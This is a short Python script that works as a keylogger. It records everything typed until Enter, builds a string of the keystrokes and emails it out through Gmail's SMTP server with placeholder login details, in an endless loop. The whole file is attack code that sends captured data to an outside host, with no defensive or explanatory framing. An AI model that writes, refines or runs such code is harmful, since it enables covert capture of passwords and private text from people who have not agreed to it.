import keyboard
import smtplib
recordd = []
while True:
    recordd = keyboard.record(until='enter')
    asp = ""
    for amk in recordd:
        asp = asp + str(amk)
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login("gmail_1", "gmail password")
    server.sendmail("gmail_1", "your gmail", asp)
    server.quit()

